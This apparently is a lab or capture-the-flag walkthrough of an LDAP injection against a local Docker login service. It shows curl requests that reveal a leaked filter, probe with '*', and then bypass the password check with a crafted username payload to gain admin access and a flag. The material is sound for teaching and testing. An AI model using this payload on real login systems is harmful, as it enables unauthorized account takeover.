# Walkthrough: LDAP Injection

## Setup

```bash
docker compose up --build -d
```

## Step 1: Enumerate

```bash
curl http://localhost:8080/
```

```json
{
  "service": "Directory Services Portal v1.3",
  "endpoints": ["POST /login  -- body: username=<u>&password=<p>"],
  "note": "Authentication backed by LDAP directory."
}
```

## Step 2: Confirm Rejection and Leak the Filter

```bash
curl -X POST http://localhost:8080/login \
  -d "username=admin&password=wrongpassword"
```

```json
{
  "success": false,
  "error": "Invalid credentials",
  "filter_used": "(&(uid=admin)(userPassword=wrongpassword))"
}
```

The response leaks the constructed LDAP filter. Input is interpolated directly.

## Step 3: Probe for Injection

```bash
curl -X POST http://localhost:8080/login \
  -d "username=*&password=anything"
```

```json
{
  "filter_used": "(&(uid=*)(userPassword=anything))",
  ...
}
```

The `*` passes through unescaped. Filter structure is controllable.

## Step 4: Inject to Bypass Password Check

```bash
curl -X POST http://localhost:8080/login \
  --data-urlencode "username=*)(uid=*))(|(uid=*" \
  --data-urlencode "password=anything"
```

```json
{
  "success": true,
  "user": "Admin User",
  "role": "admin",
  "filter_used": "(&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))",
  "flag": "POC{<32 hex chars>}"
}
```

## Explanation

The injected username closes the `uid` assertion, closes the `&` scope, then opens an `|(uid=*)` OR clause that always matches. The password check is moved outside the AND scope and never evaluated.

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```
